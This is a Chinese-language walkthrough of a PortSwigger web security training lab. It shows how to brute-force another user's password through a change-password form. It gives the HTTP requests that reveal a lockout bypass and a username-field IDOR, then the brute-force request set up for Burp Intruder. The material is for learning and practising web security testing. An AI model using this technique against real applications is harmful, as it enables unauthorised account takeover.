# 实验：通过密码更改进行密码暴力破解

本实验的密码更改功能使其容易受到暴力破解攻击。为了解决本实验，请使用候选密码列表暴力破解 Carlos 的账户并访问他的“我的账户”页面。

-   你的凭据：`wiener:peter`
-   受害者用户名：`carlos`
-   [候选密码](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## 步骤

探测密码修改功能
- 使用修改密码功能

    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=6OVhhhhyn2Z5JYqHIBD5FE0rIC0gTzYz

    username=wiener&current-password=peter&new-password-1=a&new-password-2=a
    ```

- 尝试删除会话令牌
    - 失败

- 尝试输入错误的当前密码，服务器响应 302
    ```http
    HTTP/2 302 Found
    Location: /login
    Set-Cookie: session=P5e6ePUHBF2Lr1MbSJqRlAkgrZTYjodi; Secure; HttpOnly; SameSite=None
    ```
    - 且之前的 cookie 无法继续使用


- 尝试移除新密码或设置不匹配的新密码

    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=UTuvFSfkkIS8iAdJ4gBLJXF8Oj3CFHNX

    username=wiener&current-password=aa&new-password-1=&new-password-2=
    ```
    - 服务器响应

        ```html
        <p class=is-warning>
            Current password is incorrect
        </p>
        ```
        - 并不会触发错误

- 代码路径：
    - 提供匹配的新密码时，若当前密码不正确则重定向到登录页面并注销 cookie
    - 提供不匹配/空新密码时，若当前密码不正确仅提示当前密码不正确。
        - 此时无锁定，或可进行密码爆破探测
    - 提供不匹配的新密码，若当前密码正确则显示新密码不匹配

- 尝试设置用户名字段为目标用户
    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=UTuvFSfkkIS8iAdJ4gBLJXF8Oj3CFHNX

    username=carlos&current-password=aa&new-password-1=a&new-password-2=b
    ```
    - 服务器响应

        ```html
        <p class=is-warning>
            Current password is incorrect
        </p>
        <div id=account-content>
        <p>
            Your username is: carlos
        </p>
        ```
    - 服务器未保存重置密码的会话与账户上下文，直接使用客户端状态。可进行密码爆破

发送到攻击器进行狙击爆破，综合两处漏洞：不安全的直接对象访问修改其他用户密码，以及绕过当前密码不正确时的账户锁定
- 对密码字段设置密码字典
    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=UTuvFSfkkIS8iAdJ4gBLJXF8Oj3CFHNX

    username=carlos&current-password=§aa§&new-password-1=a&new-password-2=b
    ```

- 其中一个响应拥有特异的提示
    `New passwords do not match`

- 使用当前密码登录或修改密码后登录
